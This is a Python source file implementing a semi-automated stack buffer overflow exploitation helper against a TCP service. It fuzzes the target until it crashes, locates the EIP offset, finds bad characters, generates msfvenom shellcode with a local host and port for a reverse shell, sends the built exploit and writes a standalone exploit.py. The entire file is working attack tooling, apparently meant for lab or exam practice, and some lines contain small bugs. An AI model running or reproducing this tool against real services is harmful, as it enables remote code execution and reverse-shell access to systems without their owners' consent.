#!/usr/bin/python
import binascii
import re
import socket
import subprocess
import time

from pwn import asm

# Error codes
BOFErrorSuccess = 0
BOFErrorFailure = -1
BOFErrorConnectionRefused = -2
BOFErrorConnectionReset = -3
BOFErrorConnectionTimeout = -4
BOFErrorServiceAlive = -5
BOFErrorNoSpace = -7
BOFErrorInvalid = -8

BOFAllHex = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0a', '0b', '0c', '0d', '0e', '0f', '10', '11',
             '12', '13', '14', '15', '16', '17', '18', '19', '1a', '1b', '1c', '1d', '1e', '1f', '20', '21', '22',
             '23', '24', '25', '26', '27', '28', '29', '2a', '2b', '2c', '2d', '2e', '2f', '30', '31', '32', '33',
             '34', '35', '36', '37', '38', '39', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44',
             '45', '46', '47', '48', '49', '4a', '4b', '4c', '4d', '4e', '4f', '50', '51', '52', '53', '54', '55',
             '56', '57', '58', '59', '5a', '5b', '5c', '5d', '5e', '5f', '60', '61', '62', '63', '64', '65', '66',
             '67', '68', '69', '6a', '6b', '6c', '6d', '6e', '6f', '70', '71', '72', '73', '74', '75', '76', '77',
             '78', '79', '7a', '7b', '7c', '7d', '7e', '7f', '80', '81', '82', '83', '84', '85', '86', '87', '88',
             '89', '8a', '8b', '8c', '8d', '8e', '8f', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',
             '9a', '9b', '9c', '9d', '9e', '9f', 'a0', 'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8', 'a9', 'aa',
             'ab', 'ac', 'ad', 'ae', 'af', 'b0', 'b1', 'b2', 'b3', 'b4', 'b5', 'b6', 'b7', 'b8', 'b9', 'ba', 'bb',
             'bc', 'bd', 'be', 'bf', 'c0', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'ca', 'cb', 'cc',
             'cd', 'ce', 'cf', 'd0', 'd1', 'd2', 'd3', 'd4', 'd5', 'd6', 'd7', 'd8', 'd9', 'da', 'db', 'dc', 'dd',
             'de', 'df', 'e0', 'e1', 'e2', 'e3', 'e4', 'e5', 'e6', 'e7', 'e8', 'e9', 'ea', 'eb', 'ec', 'ed', 'ee',
             'ef', 'f0', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'fa', 'fb', 'fc', 'fd', 'fe', 'ff']

# Live prefix/suffix options
BOFLiveOptions = ["payload_len"]


def live_option_long(option: str) -> bytes:
    return ("BOFLive." + option).encode()


def execute(cmd: str) -> bytes:
    return subprocess.run(cmd, shell=True, capture_output=True).stdout


def is_hex(integer: str) -> bool:
    return len(integer) == 2 and not re.search(r"[^a-f0-9]", integer)


def is_register(reg: str) -> bool:
    return True


def split_list(lst: list, n: int) -> list[list]:
    d, r = divmod(len(lst), n)
    for i in range(n):
        si = (d + 1) * (i if i < r else r) + d * (0 if i < r else i - r)
        yield lst[si:si + (d + 1 if i < r else d)]


class BOFHelper:
    def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
                 debug: bool = False):
        self._interface = interface
        self._lPort = local_port
        self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
            .decode()
        self._ip = ip
        self._port = port
        self._header = header
        self._origHeader = header
        self._liveOptions = {}
        self._prefix = prefix
        self._suffix = suffix
        self._inc = inc  # The step of increment in getNumBytesToOverflow().
        self._timeout = timeout  # The default value of 200 would be the efficient for most services.
        self._debug = debug

        for option in BOFLiveOptions:
            full_option = live_option_long(option)
            if full_option in self._header:
                self._liveOptions[full_option] = b""

        self._numBytesObtained = False
        self._eipOffset = 0
        self._eipObtained = False
        self._badChars = ["00"]
        self._badCharsFound = False
        self._shellCode = b""
        self._shellCodeGenerated = False
        self._firstStage = b""
        self._stackSpace = 0
        self._shellCodeInESP = True
        self._spaceExpanded = False
        self._eip = b""
        self._exploit = b""

    # Logs & Helpers

    def _input(self, text: str, debug: bool = False) -> str:
        if (not debug) or (debug and self._debug):
            return input(str(text))

    def __log(self, text: str, debug: bool = False) -> None:
        if (not debug) or (debug and self._debug):
            print(str(text))

    def _func_log(self, text: str, debug: bool = False) -> None:
        self.__log("[-] " + text, debug)

    def _success_log(self, text: str, debug: bool = False) -> None:
        self.__log("[+] " + text, debug)

    def _debug_log(self, text: str) -> None:
        self.__log("(-) " + text, True)

    def _step_log(self, text: str, debug: bool = False) -> None:
        self.__log("(+) " + text, debug)

    def _prompt_log(self, text: str, debug: bool = False) -> None:
        self.__log("(*) " + text, debug)

    def _warn_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!) " + text, debug)

    def _err_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!!!) " + text, debug)

    def _prompt_restart(self) -> None:
        self._prompt_log("Please restart the vulnerable application. Type anything to continue...")
        input()

    def _prompt_debugger(self) -> None:
        self._prompt_log("GO! Fire up your debugger! Type anything to continue...")
        input()

    def _process_header(self) -> None:
        for option in self._liveOptions:
            self._header = self._origHeader.replace(option, self._liveOptions[option])

    # @function send_data
    # @abstract Helper function sending data to designated port on the target.
    # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
    #               The payload would be sent with the predefined prefix and suffix, and if the
    #               request has timed out, it would be recursively resent (up to five times). To test
    #               if the service is open, simply pass an empty (i.e. "") @buffer as the argument.
    # @param buffer Bytes object storing the data to be sent.
    # @param trial  Records the number of time this request has been resent. Set to 5 to disable
    #               resending in case of socket timeout.

    def send_data(self, buffer: bytes, trial: int = 3) -> int:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((self._ip, self._port))
            payload_len = live_option_long("payload_len")
            if payload_len in self._liveOptions:
                self._liveOptions[payload_len] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
            self._process_header()
            s.send(self._header + self._prefix + buffer + self._suffix)
            res = s.recv(1024).decode()
            self._debug_log(res)

        except ConnectionRefusedError:
            self._err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
            return BOFErrorConnectionRefused

        except ConnectionResetError:
            return BOFErrorConnectionReset

        except socket.timeout:
            if trial < 5:
                return self.send_data(buffer, trial + 1)
            self._warn_log("Remember to start the service!")
            return BOFErrorConnectionTimeout

        s.close()
        time.sleep(1)
        return BOFErrorSuccess

    # @function _get_byte_for_overflow
    # @abstract Private function for finding a rough number of bytes needed to overflow the service.
    # @discussion     This function recursively sends buffers, incrementing in size each iteration by
    #                 @self._inc, to the service and checks if it has crashed. If an overflow has been
    #                 triggered successfully, it would return @current for use in its caller get_eip_offset().
    # @param current  The number of bytes that is to be sent to the service in the current iteration.
    # @result         @current if succeeded; BOFErrorConnectionRefused if failed to connect.

    def _get_byte_for_overflow(self, current: int = 0) -> int:
        if current == 0:
            self._debug_log("Checking if service is open...")
        else:
            self._debug_log("Fuzzing with %s bytes..." % current)

        error = self.send_data(b"A" * current)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused or error == BOFErrorConnectionTimeout:
            self._err_log("Connection refused! (current: %d)" % current)
            return BOFErrorConnectionRefused

        # Service crashed -> print and proceed
        elif error == BOFErrorConnectionReset:
            if current == 0:
                self._err_log("Service is not open!")
                return BOFErrorConnectionRefused

            self._success_log("Service crashed at %s bytes!" % current)
            self._prompt_restart()

            # high = @current (as it has successfully caused overflow)
            # low = previous @current (i.e. current - self._inc)
            return current

        # Service didn't crash -> increment @current by self._inc
        if current == 0:
            self._debug_log("Service is open!")
        current += self._inc
        return self._get_byte_for_overflow(current)

    # @function get_eip_offset
    # @abstract Obtain the EIP offset for the specified service.
    # @discussion Utilizing a binary search approach, this function derives the EIP offset by recursively
    #             sending data of length @mid, the average of @high and @low. If the service did not crash,
    #             @low would be increased to @mid, and if it did, @high would be decreased to @mid. The EIP
    #             would be located exactly at the threshold of the overflow (when @low + 1 == @high).
    #             Note that the service may need to be restarted repeatedly in order for the function
    #             to work.
    # @param high The current minimum number of bytes needed to overflow the service.
    # @param low  The current maximum number of bytes that would not overflow the service.
    # @result     @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect.

    def get_eip_offset(self, high: int = 0, low: int = 0) -> int:
        if self._eipObtained:
            return self._eipOffset

        if self._numBytesObtained is False:
            self._func_log("Fuzzing service...")
            high = self._get_byte_for_overflow()
            low = high - self._inc
            if high == BOFErrorConnectionRefused:
                return BOFErrorConnectionRefused
            self._numBytesObtained = True
            self._func_log("Locating EIP...")

        # Success!
        if low + 1 == high:
            self._success_log("EIP offset found: %s!\n" % low)
            self._eipOffset = low
            self._eipObtained = True
            return BOFErrorSuccess

        mid = low + (high - low) // 2  # Safe way to get mid
        self._debug_log("Sending buffer of size %s..." % mid)
        error = self.send_data(b"A" * mid)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused or error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionRefused

        # Did not crash -> set @low to mid
        elif error == BOFErrorSuccess:
            return self.get_eip_offset(high, mid)

        # Service crashed -> set @high to mid
        elif error == BOFErrorConnectionReset:
            self._prompt_restart()
            return self.get_eip_offset(mid, low)

        # Impossible case. Should never get here
        return BOFErrorInvalid

    # @function set_eip_offset
    # @abstract Manually set the EIP offset to a specified value.
    # @param offset The value @self._eipOffset is set to.

    def set_eip_offset(self, offset: int) -> None:
        self._numBytesObtained = True
        self._eipOffset = offset
        self._eipObtained = True

    def __check_input(self) -> None:
        ans = self._input("Enter bad characters found (separate with space): ") \
            .strip().lower().replace("\\x", "").replace("0x", "")
        if ans == "":
            self._success_log("Empty input, assuming that all bad characters have been found!")
            return

        for char in ans.split():
            if is_hex(char):
                self._badChars.append(char)
                BOFAllHex.remove(char)

    def __check_dump(self, chars: list[str]) -> None:
        self._prompt_log("Dump at least %d bytes (stop input with \"q\"): " % len(BOFAllHex))
        new_chars = []
        while True:
            ans = input().strip().lower().replace("\\x", "").replace("0x", "")
            if ans == "q":
                break
            for item in ans.split():
                if is_hex(item):
                    new_chars.append(item)
        self._prompt_log("Processed dump: %s" % " ".join(new_chars))
        if self._input("Proceed? (y/n)\n").strip().lower() != 'y':
            self._err_log("Dump malformed! Try again!")
            return self.__check_dump(chars)

        if len(new_chars) < len(chars):
            self._err_log("Dump is too small! Try again!")
            return self.__check_dump(chars)

        for i in range(len(chars)):
            if chars[i] != new_chars[i]:
                self._step_log("Identified new bad character: 0x%s" % chars[i])
                self._badChars.append(chars[i])
                BOFAllHex.remove(chars[i])
                break

    # @function __send_chars
    # @abstract Private function sending specified characters to service.
    # @discussion  This recursive function continuously send a list of strings to the service until all
    #              bad characters in it have been found. In each iteration, the user has to manually
    #              find the bad characters and update it through input, which would be then added to
    #              @self._badChars and removed from the @chars list.
    # @param chars The list of characters to be sent to the service.
    # @result      The update @chars if succeeded; [] if failed.

    def __send_chars(self, chars: list[str], manual: bool = False) -> int:
        offset_len = self._eipOffset - len(chars)
        error = self.send_data(b"A" * (offset_len // 2) + binascii.unhexlify("".join(chars))
                               + b"A" * (offset_len - (offset_len // 2)) + b"B" * 1, 5)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused:
            return BOFErrorConnectionRefused

        # Service should always crash
        elif error == BOFErrorSuccess:
            self._err_log("Service did not crash! (should never happen)")
            return BOFErrorServiceAlive

        self._success_log("Characters sent!")
        self._debug_log("Look at the region in between the A's!")
        if manual:
            self.__check_input()
            return BOFErrorSuccess

        self._debug_log("Make sure the dump starts with 01 02 03 04...!!!")
        self.__check_dump(chars)
        return BOFErrorSuccess

    def __send_chars_auto(self, chars: list[str]) -> int:
        self._debug_log("Sending: %s" % " ".join(chars))
        offset_len = self._eipOffset - len(chars)
        error = self.send_data(b"A" * (offset_len // 2) + binascii.unhexlify("".join(chars))
                               + b"A" * (offset_len - (offset_len // 2)) + b"B" * 1, 5)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused:
            return BOFErrorConnectionRefused

        if error == BOFErrorConnectionTimeout:
            self._prompt_restart()
            return self.__send_chars_auto(chars)

        # If the service has crashed, there would be no bad characters in this subset
        if error != BOFErrorSuccess:
            self._prompt_restart()
            return BOFErrorSuccess

        # Service did not crash
        if len(chars) == 1:
            self._step_log("Identified new bad character: 0x%s" % chars[0])
            self._badChars.append(chars[0])
            BOFAllHex.remove(chars[0])
            return BOFErrorSuccess

        # Split
        for chunk in split_list(chars, 2):
            if self.__send_chars_auto(chunk):
                return BOFErrorFailure

        return BOFErrorSuccess

    def _send_chars(self, size: int, auto: bool = False, manual: bool = False) -> int:
        for i in range(0, len(BOFAllHex), size):
            if auto:
                error = self.__send_chars_auto(BOFAllHex[i:i + size])
            else:
                error = self.__send_chars(BOFAllHex[i:i + size], manual)
            if error:
                return error
        return BOFErrorSuccess

    # @function find_bad_chars
    # @abstract Find bad characters in the service.
    # @discussion This function attempts to discover all bad characters presented in the service. It
    #             places a generated list of all characters in front of EIP, sends it to the service
    #             with _send_chars(), and sets @self._badCharsFound. If there is not enough space in
    #             the filler for all characters, this function would automatically split it into several
    #             roughly equal-sized segments and dispatch one at a time.
    #             Note that function get_eip_offset() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if failed; BOFErrorInvalid if function
    #             get_eip_offset() is not yet invoked.

    def find_bad_chars(self, manual: bool = False) -> int:
        if not self._eipObtained:
            self._err_log("Please first locate the EIP offset!")
            return BOFErrorInvalid

        if not self._badCharsFound:
            self._step_log("Starting automatic detection of bad characters...")
            size = self._eipOffset
            if self._eipOffset >= len(BOFAllHex):
                size = len(BOFAllHex)
            if self._send_chars(size, True):
                return BOFErrorFailure

            self._success_log("Automatic bad character detection complete!")
            self._success_log("Bad characters found: 0x%s" % " 0x".join(self._badChars))
            self._step_log("Sending characters to determine non-critical bad characters...")
            self._debug_log("Characters to send: 0x%s" % " 0x".join(BOFAllHex))
            self._prompt_debugger()
            if self._send_chars(size, False, manual):
                return BOFErrorFailure
            self._prompt_restart()

        self._badChars.sort()
        self._success_log("All bad characters: 0x%s" % " 0x".join(self._badChars))
        self._badCharsFound = True
        return BOFErrorSuccess

    # @function set_bad_chars
    # @abstract Manually input the bad characters identified.
    # @param bad_chars The value @self._badChars is set to.

    def set_bad_chars(self, bad_chars: list[str]) -> None:
        for item in bad_chars:
            if not is_hex(item):
                bad_chars.remove(item)
        self._badChars.extend(bad_chars)
        self._badChars = list(set(self._badChars))
        self._badCharsFound = True

    # @function generate_shellcode
    # @abstract Generate the shellcode for use in exploitation.
    # @discussion This function generates the shellcode with the command line package msfvenom. It
    #             first asks for the user to specify a payload to use - if it does not exist, a list
    #             of all available payloads would be printed. After successfully parsing the name,
    #             this function executes a msfvenom command to generate the payload, automatically
    #             completing the parameters with previously obtained values. The shellcode is stored
    #             in @self._shellCode.
    #             Note that function find_bad_chars() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorInvalid if function find_bad_chars() is not
    #             yet invoked.

    def generate_shellcode(self) -> int:
        self._func_log("Generating shellcode...")

        if not self._badCharsFound:
            self._err_log("Please first find the bad characters!")
            return BOFErrorInvalid

        # Add NOP slides
        self._shellCode += b"\x90" * int(self._input("Number of NOP slides: ").strip())
        self._step_log("Generating list of all payloads...")
        all_payloads = execute("msfvenom --list payload").decode()
        while True:
            ans = self._input("Please enter the name of the payload to employ: ").strip().lower()
            if ans in all_payloads:
                break
            self._warn_log("Payload name does not exist. Printing help page...")
            print(all_payloads)

        if not self._lIP.strip():
            self._warn_log("Failed to get local IP.")
            try:
                ip = self._input("Local IP: ").strip()
                socket.inet_aton(ip)
            except socket.error:
                self._err_log("IP address invalid!")
                return BOFErrorFailure
            self._lIP = ip

        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread –e x86/shikata_ga_nai -b\"\\x%s\""
                                   "-f raw" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
        self._shellCodeGenerated = True
        return BOFErrorSuccess

    def _check_space(self, space: int) -> bool:
        if self._stackSpace >= space:
            return True

        self._prompt_debugger()
        error = self.send_data(b"A" * self._eipOffset + b"B" * 4 + b"C" * space, 5)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused:
            return False

        # Service should always crash
        elif error == BOFErrorSuccess:
            self._err_log("Service did not crash! (should never happen)")
            return False

        # User validation required
        ans = self._input("Payload sent. Check to see if EIP is filled with 42424242. (y/n)\n").strip().lower()

        # Success! Update stack space.
        if ans == 'y':
            self._success_log("Space (size = %d) available!" % space)
            self._stackSpace = space
            self._prompt_restart()
            return True

        self._prompt_restart()
        return False

    # @function _find_space
    # @abstract Private function to locate space before EIP for the payload.
    # @discussion This function checks if the space before EIP could be used to store the payload
    #             should ESP prove to be unavailable. If the space before EIP is larger than the
    #             size of @self._shellcode, it would proceed to insert a first stage shellcode in
    #             the ESP so that the program could jump to the shellcode. The user needs to provide
    #             the register that the filler appears to be in. If there is no space in ESP even
    #             for the first stage shellcode, the function would ask for an address with an
    #             instruction that directly jumps to the designated register if possible.
    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
    #             payload.

    def _find_space(self) -> int:
        if self._eipOffset < len(self._shellCode):
            self._err_log("There is not enough space before EIP to insert the payload!")
            return BOFErrorNoSpace

        # Generate first stage shellcode
        register = self._input("Please enter the register that records your payload: ").strip()
        if is_register(register):
            self._firstStage = str(asm("add %s, %d; jmp %s" % (register, len(self._prefix), register)))
            if not self._check_space(len(self._firstStage)):
                self._err_log("There is not enough space in ESP for the first stage shellcode!")
                return BOFErrorNoSpace
        else:
            # TO-DO: EGG HUNTER
            pass

        # We have the entire filler space at our disposal
        self._stackSpace = self._eipOffset
        self._spaceExpanded = True
        self._success_log("The filler space (%s) is all yours :)" % self._eipOffset)
        return BOFErrorSuccess

    # @function expand_space
    # @abstract Attempt to expand the available space to store the shellcode.
    # @discussion In order for the shellcode to be injected, there must be sufficient space to store
    #             it. If there were not an attempt to shrink the buffer in get_eip_offset(), this
    #             function should be executed to gather more space in the stack. If the available
    #             space already exceeds the shellcode length, there is no need to run this function.
    #             After sending a payload of len(@self._shellcode), this function asks user verification
    #             to check if the space is available. If not, it would proceed to _find_space() to
    #             look for space before EIP.
    #             Note that function generate_shellcode() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorServiceAlive if service did not crash; BOFError-
    #             ConnectionRefused if connection refused.

    def expand_space(self) -> int:
        self._func_log("Expanding space...")

        if not self._shellCodeGenerated:
            self._err_log("Please first generate the shellcode!")
            return BOFErrorInvalid

        if self._check_space(len(self._shellCode)):
            self._shellCodeInESP = True
            self._spaceExpanded = True
            return BOFErrorSuccess

        self._shellCodeInESP = False
        self._step_log("Unable to perform expansion. Proceeding to find space...")
        return self._find_space()

    # @function _build_exploit
    # @abstract Build the exploit after other functions are executed.
    # @result BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked.

    def _build_exploit(self) -> int:
        self._func_log("Building exploit...")

        if not self._spaceExpanded:
            self._err_log("Please first expand space for shellcode!")
            return BOFErrorInvalid

        ans = self._input("Enter address to overwrite EIP with: ").strip().lower().replace("\\x", "").replace("0x", "")
        if re.search(r"[^a-f0-9]", ans):
            self._err_log("Address invalid!")
            return BOFErrorInvalid
        self._eip = binascii.unhexlify(ans)
        if self._shellCodeInESP:
            self._exploit = b"A" * self._eipOffset + self._eip + self._shellCode
        else:
            self._exploit = b"A" * (self._eipOffset - len(self._shellCode)) + self._shellCode + self._eip \
                            + self._firstStage

        self._success_log("Exploit built successfully!", True)
        return BOFErrorSuccess

    # @function send_exploit
    # @abstract Dispatch the exploit.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def send_exploit(self) -> int:
        self._func_log("Exploiting...")

        if not self._exploit.strip():
            if self._build_exploit():
                return BOFErrorFailure

        self._prompt_log("Remember to open up a listener if you are using shellcode to gain a reverse shell!")
        input()
        if self.send_data(self._exploit) != BOFErrorConnectionReset:
            self._err_log("Exploit failed. Try sending the payload manually.")
            return BOFErrorFailure

        self._success_log("Exploitation completed!!!")
        return BOFErrorSuccess

    # @function generate_file
    # @abstract Generate exploit.py that could be used for manual exploitation.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def generate_file(self) -> int:
        self._func_log("Generating exploit.py...")

        if not self._exploit.strip():
            if self._build_exploit():
                return BOFErrorFailure

        output = "#!/usr/bin/python\n" \
                 "import socket\n\n" \
                 "buf = %s\n" \
                 "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
                 "s.connect((\"%s\", %s))\n" \
                 "s.send(exploit)\n" \
                 "s.recv(1024)\n" \
                 "s.close()" % (self._exploit.decode(), self._ip, self._port)

        with open("/tmp/exploit.py", "w") as file:
            file.write(output)
            file.close()
            self._success_log("Successfully generated /tmp/exploit.py!")
            return BOFErrorSuccess

    # @function perform_bof
    # @abstract Perform a full BoF with member functions.
    # @result True if succeeded; False if failed.

    def perform_bof(self) -> bool:
        if self.get_eip_offset() < 0:
            return False
        if self.find_bad_chars():
            return False
        if self.generate_shellcode():
            return False
        if self.expand_space():
            return False
        if self.send_exploit():
            return False
        if self.generate_file():
            return False
        return True
